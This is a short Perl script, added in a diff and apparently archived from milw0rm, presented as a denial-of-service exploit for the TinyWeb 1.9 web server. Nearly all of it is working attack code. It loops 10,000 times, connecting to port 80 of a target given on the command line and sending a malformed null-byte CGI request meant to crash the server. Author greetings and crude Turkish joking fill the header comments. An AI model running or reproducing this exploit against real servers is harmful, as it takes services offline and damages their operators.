@@ -1,0 +1,46 @@
+#TinyWeb version 1.9 DoS Exploit
+#Coded bY ++Karak0rsan++
+#Usage:perl tiny.pl [target]
+#Greetz:Phalaposher,r3d_b4r0n,Hurby,ZzagorR,L4M3R,zeronc,Atak,sloan,fox and
+#all my friends
+# w0rdz: cengiz g t ne sokam senin ehehheh bak exploit yay nlan rsa reziL #olacan :D ama #yay nlanmaz belki yay nlansada bo ver nickini s ylemiyom #anlamazlar :P okullar a l yo peder benim #bilg. kald r yo ne yapcam ben #bilmiyom a.k :) siktiri boktan bi dos exploiti yazd k yolluyoz g venlik
+#sitesine :D neyse uzatmayal m "I AM 15 YEARS OLD" ya m z belirtelim :D
+
+$target=$ARGV[0];
+
+if(!$ARGV[0]){
+        print "TinyWeb version 1.9 DoS Exploit\n";
+        print "Coded by ++Karak0rsan++\n";
+        print "Usage:perl tiny.pl [target]\n";
+}
+
+
+use IO::Socket;
+$sock = new IO::Socket::INET( PeerAddr => $target,
+PeerPort => 80,
+Proto => 'tcp',
+Type => SOCK_STREAM, );
+close($sock);
+if($sock){
+        print "[+]Attacking...\n";
+}
+
+
+$ish=1;
+
+do {
+$ish++;
+use IO::Socket;
+$socket = new IO::Socket::INET( PeerAddr => $target,
+PeerPort => 80,
+Proto => 'tcp',
+Type => SOCK_STREAM, ) or die "Didnt Connect,please check your target
+address!\n";
+print $socket "GET /cgi-bin/.%00./dddd.html HTTP/1.0\r\n";
+close($socket);
+} while ($ish < 10000);
+
+print "OK ;)\n";
+exit();
+
+# milw0rm.com [2005-02-01]
